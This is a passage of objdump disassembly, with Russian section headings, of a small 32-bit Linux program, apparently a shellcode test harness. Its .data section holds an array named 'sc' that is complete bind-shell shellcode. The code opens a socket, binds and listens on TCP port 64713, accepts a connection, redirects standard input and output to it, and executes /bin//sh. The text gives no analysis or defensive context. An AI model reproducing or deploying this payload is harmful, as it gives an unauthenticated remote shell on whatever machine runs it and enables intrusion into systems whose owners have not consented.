 8049fa8:	08 00                	or     %al,(%eax)
 8049faa:	00 00                	add    %al,(%eax)
 8049fac:	13 00                	adc    (%eax),%eax
 8049fae:	00 00                	add    %al,(%eax)
 8049fb0:	08 00                	or     %al,(%eax)
 8049fb2:	00 00                	add    %al,(%eax)
 8049fb4:	fe                   	(bad)  
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f 8c             	ljmp   *-0x74(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f 80             	ljmp   *-0x80(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	16                   	push   %ss
 804a00d:	83 04 08 26          	addl   $0x26,(%eax,%ecx,1)
 804a011:	83 04 08 36          	addl   $0x36,(%eax,%ecx,1)
 804a015:	83 04 08 46          	addl   $0x46,(%eax,%ecx,1)
 804a019:	83                   	.byte 0x83
 804a01a:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a020 <__data_start>:
 804a020:	00 00                	add    %al,(%eax)
	...

0804a024 <__dso_handle>:
	...

0804a040 <sc>:
 804a040:	6a 66                	push   $0x66
 804a042:	58                   	pop    %eax
 804a043:	6a 01                	push   $0x1
 804a045:	5b                   	pop    %ebx
 804a046:	31 c9                	xor    %ecx,%ecx
 804a048:	51                   	push   %ecx
 804a049:	6a 01                	push   $0x1
 804a04b:	6a 02                	push   $0x2
 804a04d:	89 e1                	mov    %esp,%ecx
 804a04f:	cd 80                	int    $0x80
 804a051:	31 d2                	xor    %edx,%edx
 804a053:	52                   	push   %edx
 804a054:	66 68 fc c9          	pushw  $0xc9fc
 804a058:	66 6a 02             	pushw  $0x2
 804a05b:	89 e1                	mov    %esp,%ecx
 804a05d:	6a 10                	push   $0x10
 804a05f:	51                   	push   %ecx
 804a060:	50                   	push   %eax
 804a061:	89 e1                	mov    %esp,%ecx
 804a063:	89 c6                	mov    %eax,%esi
 804a065:	6a 02                	push   $0x2
 804a067:	5b                   	pop    %ebx
 804a068:	6a 66                	push   $0x66
 804a06a:	58                   	pop    %eax
 804a06b:	cd 80                	int    $0x80
 804a06d:	6a 66                	push   $0x66
 804a06f:	58                   	pop    %eax
 804a070:	6a 04                	push   $0x4
 804a072:	5b                   	pop    %ebx
 804a073:	cd 80                	int    $0x80
 804a075:	31 c9                	xor    %ecx,%ecx
 804a077:	51                   	push   %ecx
 804a078:	51                   	push   %ecx
 804a079:	56                   	push   %esi
 804a07a:	89 e1                	mov    %esp,%ecx
 804a07c:	6a 05                	push   $0x5
 804a07e:	5b                   	pop    %ebx
 804a07f:	6a 66                	push   $0x66
 804a081:	58                   	pop    %eax
 804a082:	cd 80                	int    $0x80
 804a084:	93                   	xchg   %eax,%ebx
 804a085:	6a 02                	push   $0x2
 804a087:	59                   	pop    %ecx
 804a088:	b0 3f                	mov    $0x3f,%al
 804a08a:	cd 80                	int    $0x80
 804a08c:	49                   	dec    %ecx
 804a08d:	79 f9                	jns    804a088 <sc+0x48>
 804a08f:	b0 0b                	mov    $0xb,%al
 804a091:	52                   	push   %edx
 804a092:	68 2f 2f 73 68       	push   $0x68732f2f
 804a097:	68 2f 62 69 6e       	push   $0x6e69622f
 804a09c:	89 e3                	mov    %esp,%ebx
 804a09e:	52                   	push   %edx
 804a09f:	53                   	push   %ebx
 804a0a0:	89 e1                	mov    %esp,%ecx
 804a0a2:	cd 80                	int    $0x80
	...

Дизассемблирование раздела .bss:

0804a0a5 <__bss_start>:
 804a0a5:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x804825c>
   a:	74 75                	je     81 <_init-0x8048253>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x804824e>
  18:	74 75                	je     8f <_init-0x8048245>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x8048233>
  33:	74 75                	je     aa <_init-0x804822a>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x8048224>
  42:	74 75                	je     b9 <_init-0x804821b>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
